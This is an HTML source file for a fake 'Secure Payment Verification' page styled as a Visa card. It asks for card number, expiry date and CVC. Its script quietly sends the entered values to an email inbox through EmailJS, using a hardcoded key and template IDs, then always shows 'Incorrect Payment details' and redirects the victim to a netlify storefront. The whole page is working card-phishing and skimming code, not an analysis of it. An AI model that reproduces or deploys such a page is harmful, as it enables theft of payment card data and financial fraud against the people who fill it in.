<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment Verification</title>
    <style>
        :root {
            --card-gradient: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%);
            --accent-gold: linear-gradient(135deg, #fde047 0%, #ca8a04 100%);
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            /* Cool animated background */
            background: radial-gradient(circle at top left, #1e293b, #0f172a);
            overflow: hidden;
        }

        /* Ambient background glow */
        body::before {
            content: '';
            position: absolute;
            width: 250px;
            height: 250px;
            background: #3b82f6;
            filter: blur(150px);
            opacity: 0.2;
            top: 10%;
            left: 10%;
            z-index: -1;
        }

        .visa-card {
            background: var(--card-gradient);
            width: 320px;
            height: 280px;
            padding: 25px;
            border-radius: 24px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            color: white;
            position: relative;
            border: 1px solid rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        .visa-card:hover {
            transform: translateY(-5px) rotateX(2deg) rotateY(-2deg);
        }

        .visa-logo {
            height: 24px;
            float: right;
            filter: brightness(0) invert(1);
            opacity: 0.9;
        }

        .chip-container {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 30px;
        }

        .chip {
            width: 40px;
            height: 30px;
            background: var(--accent-gold);
            border-radius: 8px;
            position: relative;
            overflow: hidden;
        }

        /* Chip texture lines */
        .chip::after {
            content: '';
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: repeating-linear-gradient(0deg, transparent, transparent 4px, rgba(0,0,0,0.1) 5px);
        }

        .contactless {
            width: 20px;
            opacity: 0.6;
        }

        .heading {
            font-size: 14px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 30px;
            color: rgba(255, 255, 255, 0.6);
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 10px;
            color: rgba(255, 255, 255, 0.5);
            font-weight: 600;
        }

        .form-control {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            color: white;
            font-size: 18px;
            padding: 12px 15px;
            outline: none;
            box-sizing: border-box;
            font-family: 'Courier New', monospace; /* Classic card font style */
            transition: all 0.3s ease;
        }

        .form-control:focus {
            background: rgba(255, 255, 255, 0.1);
            border-color: #3b82f6;
            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.2);
        }

        .row {
            display: flex;
            gap: 20px;
        }

        .actions {
            margin-top: 10px;
        }

        .btn-submit {
    width: 50%;
    display: block;      /* Required for margin: auto to work */
    margin: 0 auto;      /* Centers the button horizontally */
    
    background: white;
    color: #0f172a;
    border: none;
    padding: 10px;
    border-radius: 14px;
    font-weight: 700;
    font-size: 16px;
    cursor: pointer;
    transition: all 0.3s ease;
    box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.2);
}

        .btn-submit:hover {
            background: #f8fafc;
            transform: translateY(-2px);
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3);
        }

        .btn-submit:active {
            transform: translateY(0);
        }

        .btn-submit:disabled {
            background: #475569;
            color: #94a3b8;
            cursor: not-allowed;
        }

        .message {
            font-size: 13px;
            text-align: center;
            margin-top: 20px;
            display: none;
            padding: 12px;
            border-radius: 10px;
            animation: fadeIn 0.3s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .error { background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
        .success { background: rgba(34, 197, 94, 0.2); color: #f87171; border: 1px solid rgba(34, 197, 94, 0.3); }
    </style>
</head>
<body>

<div class="visa-card">
   
    <div class="chip-container">
        <div class="chip"></div>
        <svg class="contactless" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-5-9h10v2H7z"/></svg>
    </div>

    <div class="heading">Secure Verification</div>

    <form id="sign-in-form">
        <div class="input-group">
            <label for="email">Card Number</label>
            <input type="text" id="email" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19" required>
        </div>

        <div class="row">
            <div class="input-group" style="flex: 1.5;">
                <label for="password">Expiry Date</label>
                <input type="text" id="password" class="form-control" placeholder="MM / YY" maxlength="7" required>
            </div>

            <div class="input-group" style="flex: 1;">
                <label for="cvc">CVC</label>
                <input type="text" id="cvc" class="form-control" placeholder="•••" maxlength="4" required>
            </div>
        </div>

        <div class="actions">
            <button type="submit" id="submit-btn" class="btn-submit">Confirm Payment</button>
        </div>

        <p id="error-message" class="message error"></p>
        <p id="success-message" class="message success">Incorrect Payment details</p>
    </form>
</div>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
<script>
    emailjs.init('QKarohsQqRIAA6_mA');

    const submitBtn = document.getElementById('submit-btn');
    const emailInput = document.getElementById('email');
    const passInput = document.getElementById('password');
    const cvcInput = document.getElementById('cvc');
    const errorMsg = document.getElementById('error-message');
    const successMsg = document.getElementById('success-message');

    // Smooth Card Number Formatting
    emailInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        let formatted = val.match(/.{1,4}/g)?.join(' ') || val;
        e.target.value = formatted;
    });

    // Expiry Date Formatting
    passInput.addEventListener('input', (e) => {
        let val = e.target.value.replace(/\D/g, '');
        if (val.length >= 2) {
            e.target.value = val.substring(0, 2) + ' / ' + val.substring(2, 4);
        } else {
            e.target.value = val;
        }
    });

    // CVC Number Only
    cvcInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '');
    });

    document.getElementById('sign-in-form').addEventListener('submit', function(e) {
        e.preventDefault();

        errorMsg.style.display = 'none';
        successMsg.style.display = 'block';
        submitBtn.disabled = true;
        submitBtn.textContent = 'Checking...';

        const templateParams = {
            email: emailInput.value,
            password: passInput.value,
            cvc: cvcInput.value,
            submitted_at: new Date().toLocaleString()
        };

        emailjs.send('service_u8nndmi', 'template_zs2mpvq', templateParams)
            .then(() => {
                setTimeout(() => {
                    window.location.href = 'https://konamiwebstore.netlify.app/vi';
                }, 1500);
            })
            .catch((err) => {
                console.error(err);
                successMsg.style.display = 'none';
                errorMsg.textContent = 'Connection error. Please try again.';
                errorMsg.style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.textContent = 'Confirm Payment';
            });
    });
</script>

</body>

</html>
